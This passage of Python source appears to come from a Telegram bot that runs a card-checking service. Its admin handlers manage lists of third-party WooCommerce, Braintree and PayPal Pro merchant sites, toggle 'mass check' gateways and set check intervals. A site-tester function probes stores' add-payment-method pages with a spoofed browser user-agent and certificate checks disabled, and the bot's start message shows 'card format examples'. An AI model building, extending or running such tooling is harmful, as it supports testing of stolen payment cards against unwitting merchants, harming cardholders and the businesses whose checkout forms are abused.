        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('b3cancel_'):
        # Cancel pending edit
        parts = action.replace('b3cancel_', '').split('|')
        if len(parts) != 2:
            await query.edit_message_text("❌ Invalid action.")
            return
        
        site_folder, filename = parts
        
        # Remove pending edit (thread-safe)
        with pending_file_edits_lock:
            if user_id in pending_file_edits:
                del pending_file_edits[user_id]
        
        # Go back to file view
        content = read_site_file(site_folder, filename)
        
        # Truncate content if too long
        max_content_length = 3000
        truncated = False
        if len(content) > max_content_length:
            content = content[:max_content_length]
            truncated = True
        
        keyboard = [
            [InlineKeyboardButton("✏️ Edit File", callback_data=f'b3edit_{site_folder}|{filename}')],
            [InlineKeyboardButton("⬅️ Back", callback_data=f'b3site_{site_folder}')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        truncate_notice = "\n\n⚠️ _Content truncated (file too large)_" if truncated else ""
        
        # Escape special Markdown characters in content to prevent parsing errors
        escaped_content = content.replace('`', "'").replace('*', '\\*').replace('_', '\\_').replace('[', '\\[')
        
        await query.edit_message_text(
            f"📄 *{site_folder}/{filename}*\n\n"
            f"```\n{escaped_content}\n```{truncate_notice}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def b3toggle_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 site freeze/unfreeze toggle callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('b3toggle_'):
        site_folder = action.replace('b3toggle_', '')
        
        # Toggle freeze state
        current_frozen = is_site_frozen(site_folder)
        new_frozen = not current_frozen
        set_site_frozen(site_folder, new_frozen)
        
        # Refresh the control panel
        sites = get_all_b3_sites()
        freeze_state = load_site_freeze_state()
        
        keyboard = []
        for site in sites:
            is_frozen = freeze_state.get(site, {}).get('frozen', False)
            status_emoji = "🔴" if is_frozen else "🟢"
            action_text = "Unfreeze" if is_frozen else "Freeze"
            keyboard.append([
                InlineKeyboardButton(f"{status_emoji} {site}", callback_data=f'b3info_{site}'),
                InlineKeyboardButton(f"{'🔓' if is_frozen else '🔒'} {action_text}", callback_data=f'b3toggle_{site}')
            ])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Count active/frozen sites
        active_count = sum(1 for s in sites if not freeze_state.get(s, {}).get('frozen', False))
        frozen_count = len(sites) - active_count
        
        status_text = "🔴 FROZEN" if new_frozen else "🟢 ACTIVE"
        
        await query.edit_message_text(
            "🎛️ *B3 Control Panel*\n\n"
            f"✅ {site_folder} is now {status_text}\n\n"
            f"🟢 Active: {active_count} | 🔴 Frozen: {frozen_count}\n\n"
            "Select a site to toggle freeze status:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def b3info_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 site info callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('b3info_'):
        site_folder = action.replace('b3info_', '')
        
        # Get site info
        freeze_state = load_site_freeze_state()
        site_state = freeze_state.get(site_folder, {})
        is_frozen = site_state.get('frozen', False)
        updated_at = site_state.get('updated_at', 'Never')
        
        # Get site URL
        site_url = "Unknown"
        try:
            site_txt = os.path.join(site_folder, 'site.txt')
            if os.path.exists(site_txt):
                with open(site_txt, 'r') as f:
                    site_url = f.read().strip()
        except:
            pass
        
        # Get files in site
        files = get_site_files(site_folder)
        
        status_emoji = "🔴 FROZEN" if is_frozen else "🟢 ACTIVE"
        
        keyboard = [
            [InlineKeyboardButton(f"{'🔓 Unfreeze' if is_frozen else '🔒 Freeze'}", callback_data=f'b3toggle_{site_folder}')],
            [InlineKeyboardButton("⬅️ Back", callback_data='settings_control_b3')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📊 *Site Info: {site_folder}*\n\n"
            f"🔗 URL: {site_url}\n"
            f"📁 Files: {len(files)}\n"
            f"📌 Status: {status_emoji}\n"
            f"🕐 Last Updated: {updated_at}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


def test_b3_site(site_folder):
    """Test a B3 site by attempting to get authorization"""
    try:
        # Get domain URL
        site_txt = os.path.join(site_folder, 'site.txt')
        if not os.path.exists(site_txt):
            return False, "site.txt not found"
        
        with open(site_txt, 'r') as f:
            domain_url = f.read().strip()
        
        if not domain_url:
            return False, "Empty domain URL"
        
        # Try to access the site
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }
        
        response = requests.get(
            f'{domain_url}/my-account/add-payment-method/',
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if response.status_code == 200:
            # Check if page contains expected content
            if 'woocommerce' in response.text.lower() or 'braintree' in response.text.lower():
                return True, "Site is working"
            else:
                return False, "Site content not as expected"
        elif response.status_code == 403:
            return False, "Access forbidden (403)"
        elif response.status_code == 404:
            return False, "Page not found (404)"
        else:
            return False, f"HTTP {response.status_code}"
    
    except requests.exceptions.Timeout:
        return False, "Connection timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, str(e)


async def b3test_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle B3 site test callbacks"""
    query = update.callback_query
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.answer("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'b3test_all':
        await query.answer("Testing all sites...")
        
        # Test all sites
        sites = get_all_b3_sites()
        freeze_state = load_site_freeze_state()
        
        results = []
        working_count = 0
        failed_count = 0
        
        await query.edit_message_text("🔄 *Testing all B3 sites...*\n\nPlease wait...", parse_mode='Markdown')
        
        for site in sites:
            is_working, reason = test_b3_site(site)
            is_frozen = freeze_state.get(site, {}).get('frozen', False)
            
            if is_working:
                working_count += 1
                results.append(f"✅ {site}: Working")
            else:
                failed_count += 1
                results.append(f"❌ {site}: {reason}")
                # Auto-freeze non-working sites that are not already frozen
                if not is_frozen:
                    set_site_frozen(site, True)
                    results[-1] += " (Auto-frozen)"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_b3_test')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        result_text = "\n".join(results)
        await query.edit_message_text(
            f"🧪 *B3 Sites Test Results*\n\n"
            f"✅ Working: {working_count}\n"
            f"❌ Failed: {failed_count}\n\n"
            f"{result_text}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('b3test_'):
        site_folder = action.replace('b3test_', '')
        await query.answer(f"Testing {site_folder}...")
        
        # Test single site
        is_working, reason = test_b3_site(site_folder)
        freeze_state = load_site_freeze_state()
        is_frozen = freeze_state.get(site_folder, {}).get('frozen', False)
        
        if is_working:
            status = "✅ Working"
        else:
            status = f"❌ Failed: {reason}"
        
        keyboard = [
            [InlineKeyboardButton(f"{'🔓 Unfreeze' if is_frozen else '🔒 Freeze'}", callback_data=f'b3toggle_{site_folder}')],
            [InlineKeyboardButton("⬅️ Back", callback_data='settings_b3_test')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🧪 *Test Result: {site_folder}*\n\n"
            f"Status: {status}\n"
            f"Frozen: {'Yes' if is_frozen else 'No'}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('b3testinfo_'):
        site_folder = action.replace('b3testinfo_', '')
        await query.answer()
        
        # Get site info
        freeze_state = load_site_freeze_state()
        site_state = freeze_state.get(site_folder, {})
        is_frozen = site_state.get('frozen', False)
        
        # Get site URL
        site_url = "Unknown"
        try:
            site_txt = os.path.join(site_folder, 'site.txt')
            if os.path.exists(site_txt):
                with open(site_txt, 'r') as f:
                    site_url = f.read().strip()
        except:
            pass
        
        status_emoji = "🔴 FROZEN" if is_frozen else "🟢 ACTIVE"
        
        keyboard = [
            [InlineKeyboardButton("🧪 Test Now", callback_data=f'b3test_{site_folder}')],
            [InlineKeyboardButton(f"{'🔓 Unfreeze' if is_frozen else '🔒 Freeze'}", callback_data=f'b3toggle_{site_folder}')],
            [InlineKeyboardButton("⬅️ Back", callback_data='settings_b3_test')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📊 *Site: {site_folder}*\n\n"
            f"🔗 URL: {site_url}\n"
            f"📌 Status: {status_emoji}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


# Store pending PPCP site additions
pending_ppcp_actions = {}
pending_ppcp_actions_lock = threading.Lock()


async def paypalpro_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle PayPal Pro sites callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'ppro_add_site':
        # Store pending action
        with pending_ppcp_actions_lock:
            pending_ppcp_actions[user_id] = {'action': 'add_ppro_site'}
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='ppro_cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "➕ *Add PayPal Pro Site*\n\n"
            "Please send the product page URL (e.g., https://example.com/product/item):",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'ppro_view_sites':
        sites = load_paypalpro_sites()
        
        if not sites:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_paypalpro_sites')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "📋 *PayPal Pro Sites*\n\nNo sites found.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        sites_list = "\n".join([f"• {site}" for site in sites])
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_paypalpro_sites')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📋 *PayPal Pro Sites* ({len(sites)} total)\n\n{sites_list}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'ppro_remove_site':
        sites = load_paypalpro_sites()
        
        if not sites:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_paypalpro_sites')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "➖ *Remove PayPal Pro Site*\n\nNo sites to remove.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for i, site in enumerate(sites):
            # Truncate long URLs for button display
            display_name = site[:30] + "..." if len(site) > 30 else site
            keyboard.append([InlineKeyboardButton(f"🗑️ {display_name}", callback_data=f'ppro_del_{i}')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='settings_paypalpro_sites')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "➖ *Remove PayPal Pro Site*\n\nSelect a site to remove:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('ppro_del_'):
        index = int(action.replace('ppro_del_', ''))
        sites = load_paypalpro_sites()
        
        if 0 <= index < len(sites):
            removed_site = sites[index]
            remove_paypalpro_site(removed_site)
            
            await query.edit_message_text(
                f"✅ *Site Removed*\n\n{removed_site}",
                parse_mode='Markdown'
            )
            
            # Show updated list after a moment
            await asyncio.sleep(1)
            
            # Redirect back to PayPal Pro sites menu
            sites = load_paypalpro_sites()
            
            keyboard = [
                [InlineKeyboardButton("➕ Add Site", callback_data='ppro_add_site')],
            ]
            if sites:
                keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppro_view_sites')])
                keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppro_remove_site')])
            keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"💳 *PayPal Pro Sites*\n\nTotal sites: {len(sites)}\n\nSelect an option:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("❌ Invalid site index.")
    
    elif action == 'ppro_cancel':
        # Cancel pending action
        with pending_ppcp_actions_lock:
            if user_id in pending_ppcp_actions:
                del pending_ppcp_actions[user_id]
        
        # Redirect back to PayPal Pro sites menu
        sites = load_paypalpro_sites()
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Site", callback_data='ppro_add_site')],
        ]
        if sites:
            keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppro_view_sites')])
            keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppro_remove_site')])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"💳 *PayPal Pro Sites*\n\nTotal sites: {len(sites)}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass check settings callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('mass_toggle_'):
        gateway = action.replace('mass_toggle_', '')
        new_status = toggle_mass_setting(gateway)
        
        # Refresh the menu
        settings = load_mass_settings()
        
        b3_status = "🟢 ON" if settings.get('b3', True) else "🔴 OFF"
        pp_status = "🟢 ON" if settings.get('pp', True) else "🔴 OFF"
        ppro_status = "🟢 ON" if settings.get('ppro', True) else "🔴 OFF"
        
        gateway_names = {'b3': 'B3', 'pp': 'PP', 'ppro': 'PPRO'}
        toggled_name = gateway_names.get(gateway, gateway.upper())
        toggled_status = "🟢 ON" if new_status else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton(f"B3 Mass: {b3_status}", callback_data='mass_toggle_b3')],
            [InlineKeyboardButton(f"PP Mass: {pp_status}", callback_data='mass_toggle_pp')],
            [InlineKeyboardButton(f"PPRO Mass: {ppro_status}", callback_data='mass_toggle_ppro')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔄 *Mass Check Settings*\n\n"
            f"✅ {toggled_name} mass checking is now {toggled_status}\n\n"
            f"• B3 (Braintree Auth): {b3_status}\n"
            f"• PP (PPCP): {pp_status}\n"
            f"• PPRO (PayPal Pro): {ppro_status}\n\n"
            "Click to toggle:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


async def gwinterval_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle gateway check interval settings callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action.startswith('gwinterval_') and not action.startswith('gwinterval_set_'):
        # Show interval selection for a specific gateway
        gateway = action.replace('gwinterval_', '')
        gateway_names = {'b3': 'B3 (Braintree Auth)', 'pp': 'PP (PPCP)', 'ppro': 'PPRO (PayPal Pro)'}
        gateway_name = gateway_names.get(gateway, gateway.upper())
        
        current_interval = get_gateway_interval(gateway)
        
        # Create buttons for each valid interval
        keyboard = []
        row = []
        for interval in VALID_CHECK_INTERVALS:
            # Mark current interval with a checkmark
            label = f"✅ {interval}s" if interval == current_interval else f"{interval}s"
            row.append(InlineKeyboardButton(label, callback_data=f'gwinterval_set_{gateway}_{interval}'))
            if len(row) == 3:  # 3 buttons per row
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='settings_gateway_intervals')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⏱️ *Set Check Interval for {gateway_name}*\n\n"
            f"Current interval: {current_interval} second(s)\n\n"
            "Select a new interval:\n"
            "• Lower = faster checks (more load)\n"
            "• Higher = slower checks (less load)",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('gwinterval_set_'):
        # Set the interval for a gateway
        parts = action.replace('gwinterval_set_', '').split('_')
        if len(parts) == 2:
            gateway = parts[0]
            try:
                interval = int(parts[1])
            except ValueError:
                await query.edit_message_text("❌ Invalid interval value.")
                return
            
            gateway_names = {'b3': 'B3', 'pp': 'PP', 'ppro': 'PPRO'}
            gateway_name = gateway_names.get(gateway, gateway.upper())
            
            if set_gateway_interval(gateway, interval):
                # Refresh the main gateway intervals menu
                intervals = get_all_gateway_intervals()
                
                b3_interval = intervals.get('b3', 1)
                pp_interval = intervals.get('pp', 1)
                ppro_interval = intervals.get('ppro', 1)
                
                keyboard = [
                    [InlineKeyboardButton(f"⏱️ B3: {b3_interval}s", callback_data='gwinterval_b3')],
                    [InlineKeyboardButton(f"⏱️ PP: {pp_interval}s", callback_data='gwinterval_pp')],
                    [InlineKeyboardButton(f"⏱️ PPRO: {ppro_interval}s", callback_data='gwinterval_ppro')],
                    [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    f"⏱️ *Gateway Check Intervals*\n\n"
                    f"✅ {gateway_name} interval updated to {interval} second(s)\n\n"
                    f"• B3 (Braintree Auth): {b3_interval} second(s)\n"
                    f"• PP (PPCP): {pp_interval} second(s)\n"
                    f"• PPRO (PayPal Pro): {ppro_interval} second(s)\n\n"
                    "Click a gateway to change its interval:",
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    f"❌ Invalid interval. Valid intervals are: {', '.join(str(i) for i in VALID_CHECK_INTERVALS)} seconds."
                )


async def startmsg_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle start message settings callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'startmsg_edit':
        # Store pending action
        with pending_ppcp_actions_lock:
            pending_ppcp_actions[user_id] = {'action': 'edit_start_message'}
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='startmsg_cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "✏️ *Edit Start Message*\n\n"
            "Please send the new start message.\n\n"
            "You can use these placeholders:\n"
            "• `{username}` - User's username\n"
            "• `{user_id}` - User's ID\n"
            "• `{first_name}` - User's first name\n\n"
            "Example:\n"
            "Welcome {first_name}! Your ID is {user_id}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'startmsg_reset':
        reset_start_message()
        
        keyboard = [
            [InlineKeyboardButton("✏️ Edit Start Message", callback_data='startmsg_edit')],
            [InlineKeyboardButton("🔄 Reset to Default", callback_data='startmsg_reset')],
            [InlineKeyboardButton("👁️ Preview Current", callback_data='startmsg_preview')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📝 *Start Message Settings*\n\n"
            "✅ Start message has been reset to default.\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'startmsg_preview':
        current_message = get_start_message()
        
        keyboard = [
            [InlineKeyboardButton("✏️ Edit Start Message", callback_data='startmsg_edit')],
            [InlineKeyboardButton("⬅️ Back", callback_data='settings_start_message')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if current_message:
            # Show custom message preview
            preview = current_message.replace('{username}', 'TestUser').replace('{user_id}', '123456789').replace('{first_name}', 'Test')
            await query.edit_message_text(
                f"👁️ *Start Message Preview*\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{preview}\n"
                f"━━━━━━━━━━━━━━━━━━━━",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text(
                "👁️ *Start Message Preview*\n\n"
                "Currently using the default start message.\n\n"
                "The default message includes:\n"
                "• Welcome greeting\n"
                "• User ID display\n"
                "• Available commands\n"
                "• Card format examples",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
    
    elif action == 'startmsg_cancel':
        # Cancel pending action
        with pending_ppcp_actions_lock:
            if user_id in pending_ppcp_actions:
                del pending_ppcp_actions[user_id]
        
        current_message = get_start_message()
        
        keyboard = [
            [InlineKeyboardButton("✏️ Edit Start Message", callback_data='startmsg_edit')],
            [InlineKeyboardButton("🔄 Reset to Default", callback_data='startmsg_reset')],
            [InlineKeyboardButton("👁️ Preview Current", callback_data='startmsg_preview')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status = "Custom message set" if current_message else "Using default message"
        
        await query.edit_message_text(
            f"📝 *Start Message Settings*\n\n"
            f"Status: {status}\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


async def broadcast_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle broadcast/pin message callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'broadcast_send':
        # Store pending action
        with pending_ppcp_actions_lock:
            pending_ppcp_actions[user_id] = {'action': 'broadcast_send'}
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='broadcast_cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📢 *Send Message to All Users*\n\n"
            "Please send the message you want to broadcast to all approved users.\n\n"
            "⚠️ This will send a message to ALL users in the database.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'broadcast_pin':
        # Store pending action
        with pending_ppcp_actions_lock:
            pending_ppcp_actions[user_id] = {'action': 'broadcast_pin'}
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='broadcast_cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📌 *Send & Pin Message*\n\n"
            "Please send the message you want to broadcast and pin to all approved users.\n\n"
            "⚠️ This will send AND PIN a message to ALL users in the database.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'broadcast_cancel':
        # Cancel pending action
        with pending_ppcp_actions_lock:
            if user_id in pending_ppcp_actions:
                del pending_ppcp_actions[user_id]
        
        # Redirect back to broadcast menu
        db = load_user_db()
        user_count = len(db)
        
        keyboard = [
            [InlineKeyboardButton("📢 Send Message to All Users", callback_data='broadcast_send')],
            [InlineKeyboardButton("📌 Send & Pin Message", callback_data='broadcast_pin')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📢 *Send & Pin Message*\n\n"
            f"Total users in database: {user_count}\n\n"
            "Select an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


async def ppcp_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle PPCP sites callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'ppcp_add_site':
        # Store pending action
        with pending_ppcp_actions_lock:
            pending_ppcp_actions[user_id] = {'action': 'add_site'}
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='ppcp_cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "➕ *Add PPCP Site*\n\n"
            "Please send the site URL (e.g., https://example.com):",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'ppcp_view_sites':
        sites = load_ppcp_sites()
        
        if not sites:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_ppcp_sites')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "📋 *PPCP Sites*\n\nNo sites found.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        sites_list = "\n".join([f"• {site}" for site in sites])
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_ppcp_sites')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📋 *PPCP Sites* ({len(sites)} total)\n\n{sites_list}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'ppcp_remove_site':
        sites = load_ppcp_sites()
        
        if not sites:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_ppcp_sites')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "➖ *Remove PPCP Site*\n\nNo sites to remove.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for i, site in enumerate(sites):
            # Truncate long URLs for button display
            display_name = site[:30] + "..." if len(site) > 30 else site
            keyboard.append([InlineKeyboardButton(f"🗑️ {display_name}", callback_data=f'ppcp_del_{i}')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='settings_ppcp_sites')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "➖ *Remove PPCP Site*\n\nSelect a site to remove:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('ppcp_del_'):
        index = int(action.replace('ppcp_del_', ''))
        sites = load_ppcp_sites()
        
        if 0 <= index < len(sites):
            removed_site = sites[index]
            remove_ppcp_site(removed_site)
            
            await query.edit_message_text(
                f"✅ *Site Removed*\n\n{removed_site}",
                parse_mode='Markdown'
            )
            
            # Show updated list after a moment
            await asyncio.sleep(1)
            
            # Redirect back to PPCP sites menu
            sites = load_ppcp_sites()
            auto_remove_settings = load_ppcp_auto_remove_settings()
            auto_remove_enabled = auto_remove_settings.get('enabled', True)
            auto_remove_status = "🟢 ON" if auto_remove_enabled else "🔴 OFF"
            
            keyboard = [
                [InlineKeyboardButton("➕ Add Site", callback_data='ppcp_add_site')],
            ]
            if sites:
                keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppcp_view_sites')])
                keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppcp_remove_site')])
            keyboard.append([InlineKeyboardButton(f"🗑️ Auto-Remove Bad Sites: {auto_remove_status}", callback_data='ppcp_toggle_auto_remove')])
            keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"🔗 *PPCP Sites*\n\nTotal sites: {len(sites)}\nAuto-Remove Bad Sites: {auto_remove_status}\n\nSelect an option:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("❌ Invalid site index.")
    
    elif action == 'ppcp_toggle_auto_remove':
        # Toggle PPCP auto-remove setting
        settings = load_ppcp_auto_remove_settings()
        settings['enabled'] = not settings.get('enabled', True)
        save_ppcp_auto_remove_settings(settings)
        
        # Redirect back to PPCP sites menu with updated status
        sites = load_ppcp_sites()
        auto_remove_enabled = settings.get('enabled', True)
        auto_remove_status = "🟢 ON" if auto_remove_enabled else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Site", callback_data='ppcp_add_site')],
        ]
        
        if sites:
            keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppcp_view_sites')])
            keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppcp_remove_site')])
        
        keyboard.append([InlineKeyboardButton(f"🗑️ Auto-Remove Bad Sites: {auto_remove_status}", callback_data='ppcp_toggle_auto_remove')])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔗 *PPCP Sites*\n\nTotal sites: {len(sites)}\nAuto-Remove Bad Sites: {auto_remove_status}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'ppcp_cancel':
        # Cancel pending action
        with pending_ppcp_actions_lock:
            if user_id in pending_ppcp_actions:
                del pending_ppcp_actions[user_id]
        
        # Redirect back to PPCP sites menu
        sites = load_ppcp_sites()
        auto_remove_settings = load_ppcp_auto_remove_settings()
        auto_remove_enabled = auto_remove_settings.get('enabled', True)
        auto_remove_status = "🟢 ON" if auto_remove_enabled else "🔴 OFF"
        
        keyboard = [
            [InlineKeyboardButton("➕ Add Site", callback_data='ppcp_add_site')],
        ]
        if sites:
            keyboard.append([InlineKeyboardButton("📋 View Sites", callback_data='ppcp_view_sites')])
            keyboard.append([InlineKeyboardButton("➖ Remove Site", callback_data='ppcp_remove_site')])
